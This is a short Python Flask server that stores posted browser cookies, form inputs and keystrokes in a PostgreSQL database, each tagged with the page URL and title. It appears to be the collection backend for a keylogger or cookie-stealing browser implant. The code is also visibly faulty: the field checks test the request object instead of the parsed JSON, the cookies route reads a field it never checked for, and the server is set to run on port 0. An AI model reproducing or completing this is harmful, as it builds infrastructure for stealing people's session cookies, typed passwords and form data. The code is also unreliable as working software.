from db import *
from flask import Flask, request
from json import dumps
from error import *
import psycopg2

app = Flask(__name__)

conn = psycopg2.connect("dbname=server")
cur = conn.cursor()

@app.route("/create",methods=['GET'])
def createClient():
    return dumps(db_newUser(cur))

@app.route("/add/cookies", methods=['POST'])
def addCookies():
    try:
        package = request.get_json()
        if all (i in request for i in ("id","url","title","cookies")):
            db_addCookies(cur,request['id'],request['url'],request['title'],request['content'])
            conn.commit()
            return dumps({'success':True}), 200, {'ContentType':'application/json'} 
        else:
            raise InputError("Missing fields")
    except:
        raise InputError("Invalid Payload")


@app.route("/add/input",methods=['POST'])
def addInput():
    try:
        package = request.get_json()
        if all (i in request for i in ("id","url","title","type","content")):
            db_addInput(cur,request['id'],request['url'],request['title'],request['type'],request['content'])
            conn.commit()
            return dumps({'success':True}), 200, {'ContentType':'application/json'} 
        else:
            raise InputError("Missing fields")
    except:
        raise InputError("Invalid Payload")

@app.route("/add/keystrokes",methods=['POST'])
def addKeystrokes():
    try:
        package = request.get_json()
        if all (i in request for i in ("id","url","title","content")):
            db_addKeystrokes(cur,request['id'],request['url'],request['title'],request['content'])
            conn.commit()
            return dumps({'success':True}), 200, {'ContentType':'application/json'} 
        else:
            raise InputError("Missing fields")
    except:
        raise InputError("Invalid Payload")


if __name__ == "__main__":
    app.run(port=0) # Do not edit this port
